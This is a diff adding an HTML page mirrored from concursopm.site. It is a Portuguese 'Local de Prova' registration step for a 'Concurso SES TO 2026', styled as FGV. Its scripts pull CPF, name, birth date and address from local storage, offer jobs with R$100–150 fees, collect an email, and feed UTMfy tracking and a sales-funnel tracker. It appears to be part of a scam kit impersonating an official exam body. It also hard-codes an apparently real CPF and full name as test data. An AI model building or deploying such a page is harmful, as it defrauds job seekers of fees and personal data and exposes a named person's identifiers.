@@ -1,0 +1,734 @@
+<!DOCTYPE html><html lang="pt-br"><!-- Mirrored from concursopm.site/inicio/local-prova/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Sep 2025 02:22:20 GMT --><head><meta http-equiv="content-type" content="text/html;charset=utf-8">
+    
+        <meta charset="UTF-8">
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <title>Concurso SES TO 2026 - Local de Prova</title>
+
+        <script src="https://cdn.tailwindcss.com/3.3.0"></script>
+        <link href="css/all.min.css" rel="stylesheet">
+        <link href="../css/fgv-portal.css" rel="stylesheet">
+        <link href="css/home.css" rel="stylesheet">
+        <script src="js/utm-preservation.js"></script>
+        <style>
+.form-header { background-color: #233769;
+                color: white;
+                font-weight: 600;
+            }
+.btn-primary {
+                background-color: #0d6efd;
+                color: white;
+                transition: all 0.2s ease;
+            }
+            .btn-primary:hover {
+                background-color: #4d7396;
+            }
+            .btn-primary:disabled {
+                background-color: #0d6efd;
+                color: rgba(255, 255, 255, 0.6);
+                cursor: not-allowed;
+            }
+            .required-star {
+                color: #ff0000;
+            }
+            .location-card {
+                border: 2px solid #e5e7eb;
+                transition: all 0.2s ease;
+            }
+            .location-card:hover {
+                border-color: #93c5fd;
+            }
+            .location-card.selected {
+                border-color: #003f6b;
+                background-color: #f0f9ff;
+            }
+            .text-shadow {
+                text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
+            }
+            .select:invalid {
+                border-color: #ff0000;
+            }
+            .cargo-item {
+                transition: all 0.2s ease;
+            }
+            .cargo-item:hover {
+                transform: translateY(-1px);
+                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            }
+            .cargo-item.selected {
+                border-color: #003f6b;
+                background-color: #f0f9ff;
+                box-shadow: 0 0 0 2px rgba(0, 63, 107, 0.2);
+            }
+            .modal {
+                background-color: rgba(0, 0, 0, 0.5);
+            }
+            .progress-bar {
+                background: linear-gradient(90deg, #fbbf24, #f59e0b);
+                transition: width 0.3s ease;
+            }
+            .benefit-item {
+                display: flex;
+                align-items: center;
+                margin-bottom: 8px;
+            }
+            .benefit-item i {
+                color: #10b981;
+                margin-right: 8px;
+            }
+            .order-badge {
+                position: absolute;
+                top: -8px;
+                right: -8px;
+                z-index: 10;
+                animation: bounceIn 0.3s ease;
+            }
+            @keyframes bounceIn {
+                0% {
+                    transform: scale(0);
+                }
+                50% {
+                    transform: scale(1.2);
+                }
+                100% {
+                    transform: scale(1);
+                }
+            }
+            .block-header.bg-green-100 {
+                background-color: #dcfce7 !important;
+                border: 2px solid #16a34a;
+            }
+            .cargo-item {
+                position: relative;
+            }
+            .cargo-item.selected .order-badge {
+                animation: pulse 1s infinite;
+            }
+            @keyframes pulse {
+                0%,
+                100% {
+                    opacity: 1;
+                }
+                50% {
+                    opacity: 0.8;
+                }
+            }
+        </style>
+        <script>
+            // Sistema Concurso SES TO 2026 - Cargo único fixo
+            let blocoSelecionado = 1; // Bloco do concurso SES TO
+            let cargosSelecionados = []; // Selecionado via dropdown SES TO
+            let dadosCarregados = false;
+
+            document.addEventListener("DOMContentLoaded", function () {
+                // SISTEMA DE SEGURANÇA TEMPORARIAMENTE DESATIVADO
+                const cpfData = JSON.parse(
+                    localStorage.getItem("cpfData") || "{}",
+                );
+                const addressData = JSON.parse(
+                    localStorage.getItem("enderecoData") || "{}",
+                );
+
+                // Dados de teste para desenvolvimento
+                const testUserData = {
+                    CPF: "91834279372",
+                    NOME: "IRACEMA DE SOUSA SILVA",
+                    NASC: "1970-10-24 00:00:00",
+                };
+
+                let userData;
+                console.log("Dados recebidos:", cpfData);
+                
+                // Suporte para múltiplos formatos de API
+                if (cpfData.nome && cpfData.nascimento) {
+                    // Formato da API Apela - dados diretos (prioritário)
+                    userData = {
+                        NOME: cpfData.nome,
+                        NASC: cpfData.nascimento,
+                        CPF: cpfData.cpf || "N/A",
+                        SEXO: cpfData.sexo,
+                        MAE: cpfData.mae
+                    };
+                } else if (cpfData.DADOS) {
+                    // Formato da API antiga (fallback)
+                    userData = cpfData.DADOS;
+                } else if (cpfData.dados?.[0]) {
+                    // Formato da API nova (dados é um array) (fallback)
+                    userData = cpfData.dados[0];
+                } else if (cpfData.NOME && cpfData.NASCIMENTO) {
+                    // Formato da nova API direta (fallback)
+                    userData = {
+                        NOME: cpfData.NOME,
+                        NASC: cpfData.NASCIMENTO,
+                        CPF: cpfData.CPF || "N/A"
+                    };
+                } else {
+                    console.log(
+                        "⚠️ Usando dados de teste - Sistema de segurança desativado",
+                    );
+                    userData = testUserData;
+                }
+                
+                console.log("Dados processados:", userData);
+
+                document.getElementById("cpf-display").textContent =
+                    userData.CPF || testUserData.CPF;
+                document.getElementById("nome-display").textContent =
+                    userData.NOME || testUserData.NOME;
+
+                // Carregar dados da cidade de prova
+                const cidadeProvaData = JSON.parse(
+                    localStorage.getItem("cidadeProvaDeterminada") || "{}",
+                );
+
+                const cidadeElements =
+                    document.querySelectorAll("#cidade-display");
+                cidadeElements.forEach((element) => {
+                    element.textContent = addressData.cidade || "Não informado";
+                });
+
+                const ufElements = document.querySelectorAll("#uf-display");
+                ufElements.forEach((element) => {
+                    element.textContent = addressData.uf || "";
+                });
+
+                // Inicializar seleção de cidade de prova será chamada após definir todas as funções
+
+                // Carregar seleções anteriores se existirem
+                const savedCargos = JSON.parse(
+                    localStorage.getItem("cargosSelecionados") || "[]",
+                );
+                const savedBlock = localStorage.getItem("blocoSelecionado");
+
+                if (savedCargos.length > 0 && savedBlock) {
+                    cargosSelecionados = savedCargos;
+                    blocoSelecionado = parseInt(savedBlock);
+
+                    // Restaurar interface será feita após carregar os dados CNU
+                }
+
+                const form = document.getElementById("local-form");
+                form.addEventListener("submit", function (e) {
+                    e.preventDefault();
+
+                    // Validar e-mail
+                    const emailInput =
+                        document.getElementById("email-confirmacao");
+                    const email = emailInput.value.trim();
+
+                    if (!email) {
+                        alert(
+                            "Por favor, digite seu e-mail para receber o Cartão de Confirmação",
+                        );
+                        emailInput.focus();
+                        return;
+                    }
+
+                    // Validar formato do e-mail
+                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                    if (!emailRegex.test(email)) {
+                        alert("Por favor, digite um e-mail válido");
+                        emailInput.focus();
+                        return;
+                    }
+
+                    const cargoSel = document.getElementById("cargo-ses-to");
+                    const temCargo = (cargoSel && cargoSel.value.trim() !== "") || (cargosSelecionados && cargosSelecionados.length > 0);
+                    if (!temCargo) {
+                        alert("Selecione um cargo para continuar");
+                        if (cargoSel) cargoSel.focus();
+                        return;
+                    }
+
+                    const temCidade = !!(
+                        document.querySelector('input[name="cidade-prova"]:checked') ||
+                        document.querySelector(".location-card.selected")
+                    );
+                    if (!temCidade) {
+                        alert("Selecione uma cidade de prova para continuar");
+                        return;
+                    }
+
+                    // Salvar dados da seleção final incluindo e-mail
+                    const selectionData = {
+                        cargos: cargosSelecionados,
+                        bloco: blocoSelecionado,
+                        email: email,
+                        timestamp: new Date().toISOString(),
+                    };
+                    localStorage.setItem(
+                        "selecaoFinalCNU",
+                        JSON.stringify(selectionData),
+                    );
+                    localStorage.setItem(
+                        "cargosSelecionados",
+                        JSON.stringify(cargosSelecionados),
+                    );
+                    localStorage.setItem(
+                        "blocoSelecionado",
+                        blocoSelecionado.toString(),
+                    );
+                    localStorage.setItem("emailConfirmacao", email);
+                    localStorage.setItem("inscricaoConcluida", "true");
+
+                    console.log("Dados salvos:", selectionData);
+                    try { if (window.FunnelTracker) FunnelTracker.advance('local-prova'); } catch (e) {}
+                    redirectWithUtmParams("/CNU-info/");
+                });
+
+                // Carregar seleções anteriores se existirem
+                function carregarSelecaoAnterior() {
+                    try {
+                        const cargosAnteriores = JSON.parse(
+                            localStorage.getItem("cargosSelecionados") || "[]",
+                        );
+                        const cargoSel = document.getElementById("cargo-ses-to");
+                        if (cargosAnteriores.length > 0 && cargoSel) {
+                            cargosSelecionados = cargosAnteriores;
+                            const c0 = cargosAnteriores[0] || {};
+                            const id = c0.id || "";
+                            if (id) {
+                                for (let i = 0; i < cargoSel.options.length; i++) {
+                                    const opt = cargoSel.options[i];
+                                    if (opt.value && opt.value.split("|")[0] === id) {
+                                        cargoSel.value = opt.value;
+                                        onCargoSesToChange(cargoSel);
+                                        break;
+                                    }
+                                }
+                            }
+                        }
+                        const cidadeFinal = JSON.parse(localStorage.getItem("cidadeProvaFinal") || "{}");
+                        if (cidadeFinal.cityId) {
+                            const card = document.querySelector('.location-card input[value="' + cidadeFinal.cityId + '"]');
+                            if (card && card.closest) {
+                                selectProvaLocation(card.closest(".location-card"), cidadeFinal.cityId);
+                            }
+                        }
+                        updateSubmitButton();
+                    } catch (error) {
+                        console.error("Erro ao carregar seleção anterior:", error);
+                    }
+                }
+
+                // Aguardar um pouco após carregar a interface para restaurar seleções
+                setTimeout(carregarSelecaoAnterior, 500);
+
+                setTimeout(function () {
+                    const emailInput = document.getElementById("email-confirmacao");
+                    if (emailInput) {
+                        emailInput.addEventListener("input", function () {
+                            updateSubmitButton();
+                        });
+                    }
+                    applyEmailFromStorage();
+                    updateSubmitButton();
+                }, 50);
+            });
+
+            // FUNÇÕES SIMPLIFICADAS PARA SISTEMA DE TESTE
+
+            // Função para selecionar cidade de prova
+            function selectProvaLocation(element, cityId) {
+                document.querySelectorAll(".location-card").forEach((card) => {
+                    card.classList.remove("selected");
+                });
+
+                element.classList.add("selected");
+                const radio = element.querySelector('input[type="radio"]');
+                if (radio) radio.checked = true;
+
+                try {
+                    const label = (element.querySelector("h5") || {}).textContent || cityId;
+                    const addressData = JSON.parse(localStorage.getItem("enderecoData") || "{}");
+                    localStorage.setItem(
+                        "cidadeProvaFinal",
+                        JSON.stringify({
+                            cidadeProva: label.trim(),
+                            cityId: cityId,
+                            uf: addressData.uf || "TO",
+                            selecionadaEm: new Date().toISOString(),
+                            automatica: false,
+                        }),
+                    );
+                } catch (e) {}
+
+                if (typeof updateSubmitButton === "function") updateSubmitButton();
+                if (typeof atualizarBotaoContinuar === "function") atualizarBotaoContinuar();
+            }
+
+            // Função para toggle de cargos
+            function toggleCargo(checkbox, cargoId) {
+                const isChecked = checkbox.checked;
+
+                if (isChecked) {
+                    // Adicionar cargo
+                    cargosSelecionados.push({
+                        id: cargoId,
+                        nome: checkbox
+                            .closest("label")
+                            .querySelector(".font-medium").textContent,
+                        ordem: cargosSelecionados.length + 1,
+                    });
+                } else {
+                    // Remover cargo
+                    cargosSelecionados = cargosSelecionados.filter(
+                        (cargo) => cargo.id !== cargoId,
+                    );
+                    // Reordenar
+                    cargosSelecionados.forEach((cargo, index) => {
+                        cargo.ordem = index + 1;
+                    });
+                }
+
+                console.log("Cargos selecionados:", cargosSelecionados);
+                updateSubmitButton();
+            }
+
+            // Função para atualizar botão de envio
+            function onCargoSesToChange(sel) {
+                const val = (sel && sel.value) ? sel.value.trim() : "";
+                const resumo = document.getElementById("cargo-resumo");
+                if (!val) {
+                    cargosSelecionados = [];
+                    localStorage.removeItem("cargosSelecionados");
+                    localStorage.removeItem("taxaValor");
+                    localStorage.removeItem("nivel");
+                    localStorage.removeItem("cargo");
+                    if (resumo) resumo.textContent = "Remuneração conforme Anexo III | 5.124 vagas | Banca FGV | Prova 01/11/2026";
+                    if (typeof updateSubmitButton === "function") updateSubmitButton();
+                    if (typeof atualizarBotaoContinuar === "function") atualizarBotaoContinuar();
+                    return;
+                }
+                const parts = val.split("|");
+                const id = parts[0] || "";
+                const nome = parts[1] || id;
+                const salario = parts[2] || "";
+                const taxa = Number(parts[3] || 150);
+                const nivel = parts[4] || "superior";
+                cargosSelecionados = [{
+                    id: id,
+                    nome: nome,
+                    title: nome,
+                    cargo: nome,
+                    salario: salario,
+                    taxa: taxa,
+                    nivel: nivel,
+                    ordem: 1
+                }];
+                localStorage.setItem("cargosSelecionados", JSON.stringify(cargosSelecionados));
+                localStorage.setItem("taxaValor", String(taxa));
+                localStorage.setItem("nivel", nivel);
+                localStorage.setItem("cargo", nome);
+                if (resumo) {
+                    resumo.textContent = nome + " | Taxa R$ " + taxa.toFixed(2).replace(".", ",") + " | Remuneração R$ " + (salario ? Number(salario).toLocaleString("pt-BR", {minimumFractionDigits: 2}) : "conforme Anexo III");
+                }
+                if (typeof window.resolveTaxaSesTo === "function") {
+                    try { window.resolveTaxaSesTo(); } catch (e) {}
+                }
+                if (typeof updateSubmitButton === "function") updateSubmitButton();
+                if (typeof atualizarBotaoContinuar === "function") atualizarBotaoContinuar();
+            }
+            function updateSubmitButton() {
+                const submitButton = document.getElementById("submit-button");
+                const emailInput = document.getElementById("email-confirmacao");
+                const emailVal = emailInput ? emailInput.value.trim() : "";
+                const hasEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailVal);
+                const hasCidade = !!(
+                    document.querySelector('input[name="cidade-prova"]:checked') ||
+                    document.querySelector(".location-card.selected")
+                );
+
+                const cargoSelect = document.getElementById("cargo-ses-to");
+                const hasCargoSelect = cargoSelect && cargoSelect.value.trim() !== "";
+                const hasCargos = hasCargoSelect || (cargosSelecionados && cargosSelecionados.length > 0);
+                const canSubmit = hasEmail && hasCidade && hasCargos;
+
+                if (submitButton) {
+                    submitButton.disabled = !canSubmit;
+                    if (canSubmit) {
+                        submitButton.classList.remove("opacity-50", "cursor-not-allowed");
+                    } else {
+                        submitButton.classList.add("opacity-50", "cursor-not-allowed");
+                    }
+                }
+
+                const statusText = document.getElementById("selection-status");
+                if (!statusText) return;
+                if (!hasCargos) {
+                    statusText.textContent = "Selecione um cargo para continuar";
+                    statusText.className = "text-sm text-gray-500 text-center mt-2";
+                } else if (!hasCidade) {
+                    statusText.textContent = "Selecione uma cidade de prova para continuar";
+                    statusText.className = "text-sm text-gray-500 text-center mt-2";
+                } else if (!hasEmail) {
+                    statusText.textContent = "Digite um e-mail válido para continuar";
+                    statusText.className = "text-sm text-gray-500 text-center mt-2";
+                } else {
+                    statusText.textContent = "Tudo pronto! Clique em continuar";
+                    statusText.className = "text-sm text-green-600 text-center mt-2";
+                }
+            }
+
+            function atualizarBotaoContinuar() {
+                updateSubmitButton();
+            }
+
+            function applyEmailFromStorage() {
+                const emailInput = document.getElementById("email-confirmacao");
+                if (!emailInput) return;
+                let email = "";
+                try { email = localStorage.getItem("emailConfirmacao") || ""; } catch (e) {}
+                if (!email) {
+                    try {
+                        const cad = JSON.parse(localStorage.getItem("cadastroRapido") || "{}");
+                        if (cad && cad.email) email = String(cad.email).trim();
+                    } catch (e) {}
+                }
+                if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return;
+
+                emailInput.value = email;
+                const wrap = document.getElementById("email-input-wrap");
+                const confirmed = document.getElementById("email-confirmed");
+                const confirmedText = document.getElementById("email-confirmed-text");
+                if (confirmedText) confirmedText.textContent = email;
+                if (wrap) wrap.classList.add("hidden");
+                if (confirmed) confirmed.classList.remove("hidden");
+                updateSubmitButton();
+            }
+
+            function editarEmail() {
+                const wrap = document.getElementById("email-input-wrap");
+                const confirmed = document.getElementById("email-confirmed");
+                if (confirmed) confirmed.classList.add("hidden");
+                if (wrap) wrap.classList.remove("hidden");
+                const emailInput = document.getElementById("email-confirmacao");
+                if (emailInput) {
+                    emailInput.focus();
+                    emailInput.select();
+                }
+            }
+
+            window.selectProvaLocation = selectProvaLocation;
+            window.toggleCargo = toggleCargo;
+            window.onCargoSesToChange = onCargoSesToChange;
+            window.updateSubmitButton = updateSubmitButton;
+            window.atualizarBotaoContinuar = atualizarBotaoContinuar;
+            window.applyEmailFromStorage = applyEmailFromStorage;
+            window.editarEmail = editarEmail;
+        </script>
+    <!-- UTMfy Pixel -->
+    <script>
+      window.googlePixelId = "68fafce3e95a8ad5bfc8863d";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmfy.com.br/scripts/pixel/pixel-google.js");
+      document.head.appendChild(a);
+    </script>
+
+    <script
+      src="https://cdn.utmfy.com.br/scripts/utms/latest.js"
+      data-utmfy-prevent-xcod-sck
+      data-utmfy-prevent-subids
+      async
+      defer
+    ></script>
+    </head>
+    <body class="fgv-body">
+        <div class="fgv-brand fgv-brand--compact">
+            <img src="logo-fgv-conhecimento.svg" alt="FGV Conhecimento">
+        </div>
+        <main class="flex-grow py-8">
+            <div class="container mx-auto px-4 max-w-3xl">
+                <div class="border border-gray-300 rounded">
+                    <div class="form-header py-2 px-4 text-center">
+                        <h2 class="text-lg">Inscrição > Local de Prova</h2>
+                    </div>
+                    <div class="p-6">
+                        <div class="bg-[#2B5984] p-4 rounded-md mb-5 text-white shadow-md">
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                <div class="p-2">
+                                    <p class="text-sm text-gray-200">CPF:</p>
+                                    <p id="cpf-display" class="font-semibold text-shadow">
+                                        ...
+                                    </p>
+                                </div>
+                                <div class="p-2">
+                                    <p class="text-sm text-gray-200">
+                                        Nome Completo:
+                                    </p>
+                                    <p id="nome-display" class="font-semibold text-shadow">
+                                        ...
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                        <form id="local-form" class="space-y-5">
+                            <div>
+                                                                <div class="mb-4 p-4 bg-green-50 border border-green-200 rounded-lg">
+                                    <h4 class="font-bold text-green-800 mb-2 flex items-center">
+                                        <i class="fas fa-briefcase text-green-600 mr-2"></i>
+                                        Selecione o Cargo (Anexo II)
+                                    </h4>
+                                    <select id="cargo-ses-to" class="w-full border border-gray-300 p-2 rounded bg-white text-gray-800" onchange="onCargoSesToChange(this)">
+                                        <option value="">-- Escolha um cargo --</option>
+                                        <optgroup label="Nível Médio / Técnico — Taxa R$ 100,00">
+                                            <option value="assistente-servicos-saude|Assistente de Serviços de Saúde|1735.55|100|medio">Assistente de Serviços de Saúde — R$ 1.735,55</option>
+                                            <option value="tecnico-enfermagem|Técnico em Enfermagem|2008.18|100|medio">Técnico em Enfermagem — R$ 2.008,18</option>
+                                            <option value="tecnico-radiologia|Técnico em Radiologia|2008.18|100|medio">Técnico em Radiologia — R$ 2.008,18</option>
+                                            <option value="tecnico-laboratorio|Técnico em Laboratório|2008.18|100|medio">Técnico em Laboratório — R$ 2.008,18</option>
+                                            <option value="tecnico-saude-bucal|Técnico em Saúde Bucal|2008.18|100|medio">Técnico em Saúde Bucal — R$ 2.008,18</option>
+                                            <option value="tecnico-imobilizacao|Técnico em Imobilização Ortopédica|2008.18|100|medio">Técnico em Imobilização Ortopédica — R$ 2.008,18</option>
+                                        </optgroup>
+                                        <optgroup label="Nível Superior — Taxa R$ 150,00">
+                                            <option value="enfermeiro|Enfermeiro|4917.01|150|superior">Enfermeiro — R$ 4.917,01</option>
+                                            <option value="enfermeiro-obstetra|Enfermeiro Obstetra|8421.31|150|superior">Enfermeiro Obstetra — R$ 8.421,31</option>
+                                            <option value="farmaceutico|Farmacêutico|4917.01|150|superior">Farmacêutico — conforme Anexo III</option>
+                                            <option value="fisioterapeuta|Fisioterapeuta|4917.01|150|superior">Fisioterapeuta — conforme Anexo III</option>
+                                            <option value="psicologo|Psicólogo|4917.01|150|superior">Psicólogo — conforme Anexo III</option>
+                                            <option value="assistente-social|Assistente Social|4917.01|150|superior">Assistente Social — conforme Anexo III</option>
+                                            <option value="nutricionista|Nutricionista|4917.01|150|superior">Nutricionista — conforme Anexo III</option>
+                                            <option value="administrador|Administrador Hospitalar|5980.71|150|superior">Administrador Hospitalar — R$ 5.980,71</option>
+                                            <option value="medico|Médico|13080.13|150|superior">Médico — R$ 13.080,13</option>
+                                            <option value="medico-rqe-pediatra|Médico RQE - Pediatra|17727.63|150|superior">Médico RQE - Pediatra — R$ 17.727,63</option>
+                                            <option value="medico-rqe-go|Médico RQE - Ginecologista-Obstetra|17727.63|150|superior">Médico RQE - G.O. — R$ 17.727,63</option>
+                                        </optgroup>
+                                    </select>
+                                    <div id="cargo-resumo" class="text-sm text-gray-600 mt-2">Remuneração conforme Anexo III | 5.124 vagas | Banca FGV | Prova 01/11/2026</div>
+                                </div>
+                            </div>
+
+                            <input type="hidden" id="selected-location-id" value="">
+                            <div class="bg-[#f0f9ff] border-2 border-[#003f6b] p-4 rounded-md shadow-md">
+                                <h4 class="font-bold text-gray-800 flex items-center">
+                                    <i class="fas fa-map-marker-alt text-[#003f6b] mr-2"></i>
+                                    <span>Município de Prova</span>
+                                </h4>
+                                <div class="mt-3 text-gray-700">
+                                    <div id="cidade-prova-container">
+                                        <div class="space-y-2">
+                                            <p class="font-medium text-gray-800 mb-3">
+                                                Selecione uma cidade de prova:
+                                            </p>
+
+                                                                                        <div class="grid grid-cols-1 md:grid-cols-2 gap-2 max-h-80 overflow-y-auto border border-gray-200 rounded-lg p-3">
+                                                <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50" onclick="selectProvaLocation(this, 'araguaina-to')"><div class="flex items-center"><input type="radio" name="cidade-prova" value="araguaina-to" class="mr-3"><div><h5 class="font-semibold text-gray-800">Araguaína - TO</h5></div></div></div>
+                                                <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50" onclick="selectProvaLocation(this, 'araguatins-to')"><div class="flex items-center"><input type="radio" name="cidade-prova" value="araguatins-to" class="mr-3"><div><h5 class="font-semibold text-gray-800">Araguatins - TO</h5></div></div></div>
+                                                <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50" onclick="selectProvaLocation(this, 'arraias-to')"><div class="flex items-center"><input type="radio" name="cidade-prova" value="arraias-to" class="mr-3"><div><h5 class="font-semibold text-gray-800">Arraias - TO</h5></div></div></div>
+                                                <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50" onclick="selectProvaLocation(this, 'dianopolis-to')"><div class="flex items-center"><input type="radio" name="cidade-prova" value="dianopolis-to" class="mr-3"><div><h5 class="font-semibold text-gray-800">Dianópolis - TO</h5></div></div></div>
+                                                <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50" onclick="selectProvaLocation(this, 'gurupi-to')"><div class="flex items-center"><input type="radio" name="cidade-prova" value="gurupi-to" class="mr-3"><div><h5 class="font-semibold text-gray-800">Gurupi - TO</h5></div></div></div>
+                                                <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50" onclick="selectProvaLocation(this, 'palmas-to')"><div class="flex items-center"><input type="radio" name="cidade-prova" value="palmas-to" class="mr-3"><div><h5 class="font-semibold text-gray-800">Palmas - TO</h5></div></div></div>
+                                                <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50" onclick="selectProvaLocation(this, 'paraiso-do-tocantins-to')"><div class="flex items-center"><input type="radio" name="cidade-prova" value="paraiso-do-tocantins-to" class="mr-3"><div><h5 class="font-semibold text-gray-800">Paraíso do Tocantins - TO</h5></div></div></div>
+                                                <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50" onclick="selectProvaLocation(this, 'porto-nacional-to')"><div class="flex items-center"><input type="radio" name="cidade-prova" value="porto-nacional-to" class="mr-3"><div><h5 class="font-semibold text-gray-800">Porto Nacional - TO</h5></div></div></div>
+                                            </div>
+</div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Campo de E-mail -->
+                            <div class="bg-[#f8fafc] border-2 border-[#e2e8f0] p-4 rounded-md shadow-sm mt-4">
+                                <h4 class="font-bold text-gray-800 flex items-center mb-3">
+                                    <i class="fas fa-envelope text-[#003f6b] mr-2"></i>
+                                    <span>Cartão de Confirmação</span>
+                                </h4>
+                                <div id="email-confirmed" class="hidden mb-2 p-3 bg-green-50 border border-green-200 rounded-md">
+                                    <p class="text-sm text-green-800">
+                                        <i class="fas fa-check-circle mr-1"></i>
+                                        E-mail confirmado: <strong id="email-confirmed-text"></strong>
+                                    </p>
+                                    <button type="button" class="text-xs text-[#003f6b] underline mt-1" onclick="editarEmail()">Alterar e-mail</button>
+                                </div>
+                                <div id="email-input-wrap" class="mb-2">
+                                    <label for="email-confirmacao" class="block mb-2 font-medium text-gray-700">
+                                        Digite seu e-mail para receber o Cartão
+                                        de Confirmação:
+                                        <span class="required-star">*</span>
+                                    </label>
+                                    <input type="email" id="email-confirmacao" class="w-full border border-gray-300 p-2 rounded-md focus:border-blue-500 focus:ring-1 focus:ring-blue-500" placeholder="seu@email.com" oninput="updateSubmitButton()" required="">
+                                    <p class="text-xs text-gray-600 mt-1">
+                                        <i class="fas fa-info-circle mr-1"></i>
+                                        O Cartão de Confirmação contém o local
+                                        exato da prova e seu número de
+                                        inscrição.
+                                    </p>
+                                </div>
+                            </div>
+
+                            <div class="border-t border-gray-300 pt-4 mt-6">
+                                <button type="submit" id="submit-button" disabled="" class="btn-primary w-full py-3 rounded-md flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed">
+                                    <i class="fas fa-arrow-right mr-2"></i>
+                                    <span>Continuar</span>
+                                </button>
+                                <p id="selection-status" class="text-sm text-gray-500 text-center mt-2">
+                                    Selecione pelo menos um cargo para continuar
+                                </p>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </main>
+        <footer class="fgv-footer">
+  <img src="logo-fgv-conhecimento.svg" alt="FGV Conhecimento">
+  <div>FGV Conhecimento</div>
+</footer>
+
+        <!-- Scripts para carregamento dos dados CNU via API -->
+        <script>
+            // 🔄 Variável global para armazenar dados PM SP carregados da API
+            window.CARGOS_PM_DATA = null;
+
+            // 🚀 API CNU legada desativada — cargos SES TO estão no select estático
+            async function carregarDadosPM() { return; }
+            async function carregarDadosCNU() { return; }
+
+            document.addEventListener("DOMContentLoaded", function () {
+                if (typeof window.applyEmailFromStorage === "function") window.applyEmailFromStorage();
+                if (typeof window.updateSubmitButton === "function") window.updateSubmitButton();
+            });
+
+            function buscarDadosBloco() { return null; }
+
+            window.addEventListener("cnuDadosCarregados", function () {});
+            window.addEventListener("cnuErroCarregamento", function () {});
+
+            function carregarInterfaceCargos() { return; }
+            function gerarCargosBloco() { return ""; }
+            function toggleBloco() { return; }
+            function handleCargoSelection() { return; }
+            function desabilitarOutrosBlocos() { return; }
+            function habilitarTodosBlocos() { return; }
+            function mostrarAlertaBloco() { return; }
+            function adicionarBadgeOrdem() { return; }
+            function removerBadgeOrdem() { return; }
+            function atualizarResumoSelecao() { return; }
+            function buscarCargoPorCodigo() { return null; }
+            function removerCargo() { return; }
+
+            // Usa a lógica do script do head (não sobrescrever)
+            // function atualizarBotaoContinuar — definida no head
+
+            // Não sobrescrever a grade estática de cidades
+            function initializarSelecaoCidadeProva() { return; }
+            function atualizarCidadeProva() { return; }
+            function salvarCidadeProva(cidade, uf) {
+                try {
+                    localStorage.setItem(
+                        "cidadeProvaFinal",
+                        JSON.stringify({
+                            cidadeProva: cidade,
+                            uf: uf,
+                            selecionadaEm: new Date().toISOString(),
+                            automatica: false,
+                        }),
+                    );
+                } catch (e) {}
+            }
+
+            // ✅ Sem reinit destrutivo da UI de cidades
+        </script>
+    
+<script src="/js/funnel-tracker.js" data-funnel-step="local-prova"></script>
+
+</body><!-- Mirrored from concursopm.site/inicio/local-prova/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Sep 2025 02:22:21 GMT --></html>
